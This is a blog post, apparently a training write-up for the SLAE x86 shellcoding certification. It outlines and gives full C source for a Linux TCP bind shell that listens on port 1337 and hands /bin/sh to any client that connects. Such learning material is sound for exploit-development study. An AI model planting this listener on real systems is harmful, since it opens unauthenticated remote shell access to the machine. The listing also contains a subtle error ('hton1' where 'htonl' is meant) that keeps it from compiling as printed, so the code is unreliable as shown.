---
title:  "SLAE x86 Assignment 1: TCP Bind Shell"
header:
  teaser: "/assets/images/500x300.png"
categories:
  - exploit dev
tags:
  - exploit dev
  - slae
---

Hey guys! Welcome to my first SLAE x86 Assignments post! This series of posts aims to fulfil the requirements of the SLAE x86 certification from Pentester Academy, while also making shellcoding easier to understand for people just starting out in the field of exploit development. Let's begin with assignment 1!

## Understanding the objective ##
In order to effectively understand what the shellcode must do, it is a good idea to start off by breaking down the code's major working parts. The shellcode must do the following:

- Creates and configures a socket
- Binds an IP and port to that socket
- Listens for a connection and accepts it
- Duplicates standard file descriptors, so that the shell can interact with the socket
- Spawns a shell

Now that we have an outline for our TCP bind shell, let's write a little C code that does this for us, in order to get a better understanding of how socket functions work.

```c
// SLAE Assignment 1: Shell Bind TCP (Linux/x86)
// Author:  4p0cryph0n
// Website:  https://4p0cryph0n.github.io

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
    //Defining Address Structure
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1337); //Port no.
    addr.sin_addr.s_addr = hton1(INADDR_ANY); //Use any interface to listen

    //Create and Configure Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    //Bind Socket
    bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));

    //Listen
    listen(sockfd, 0);

    //Duplicate Standard File Descriptors
    int stdfd = accept(sockfd, NULL, NULL);
    for (int i = 0; i < 3; i++)
    {
        dup2(stdfd, i);
    }

    //Execute Shell
    execve("/bin/sh", NULL, NULL);
    return 0;  
}
```
